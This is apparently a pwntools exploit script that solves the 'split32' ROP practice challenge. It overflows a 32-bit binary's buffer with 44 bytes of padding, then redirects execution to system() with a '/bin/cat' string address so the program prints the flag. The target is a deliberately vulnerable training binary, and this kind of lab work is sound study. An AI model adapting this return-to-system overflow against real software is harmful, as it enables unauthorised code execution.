from pwn import *

context(terminal=['tmux', 'new-window'])
context(os='linux', arch='i386')
# p = gdb.debug('./split32')
p = process('./split32')

bincat = p32(0x0804a030)
system = p32(0x08048657)
padding = "A"*44

payload = padding.encode() + system + bincat 

p.sendline(payload)
print(p.recvall().decode())
